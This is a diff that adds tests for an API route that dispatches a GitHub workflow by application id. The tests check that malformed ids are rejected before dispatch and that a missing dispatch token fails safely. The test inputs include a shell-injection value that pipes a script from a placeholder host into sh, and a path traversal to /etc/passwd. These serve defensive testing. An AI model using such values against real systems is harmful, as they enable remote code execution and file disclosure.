@@ -25,4 +25,24 @@ describe("POST /api/applications/[id]/submit", () => {
     const res = await POST(makeRequest(), { params: Promise.resolve({ id: "5" }) });
     expect(res.status).toBe(502);
   });
+
+  // This id lands in the environment of the one workflow that sets APPLY_AGENT_ARMED=1.
+  // A non-numeric value has no legitimate use, so reject it before it ever gets dispatched.
+  it.each([
+    ['1"; curl evil.sh | sh; "', "shell metacharacters"],
+    ["../../etc/passwd", "path traversal"],
+    ["", "empty"],
+    ["5abc", "trailing garbage"],
+  ])("rejects a non-numeric id (%s) without dispatching", async (badId) => {
+    const res = await POST(makeRequest(), { params: Promise.resolve({ id: badId }) });
+    expect(res.status).toBe(400);
+    expect(global.fetch).not.toHaveBeenCalled();
+  });
+
+  it("returns 500 when GITHUB_DISPATCH_TOKEN is missing, without dispatching", async () => {
+    vi.stubEnv("GITHUB_DISPATCH_TOKEN", "");
+    const res = await POST(makeRequest(), { params: Promise.resolve({ id: "5" }) });
+    expect(res.status).toBe(500);
+    expect(global.fetch).not.toHaveBeenCalled();
+  });
 });
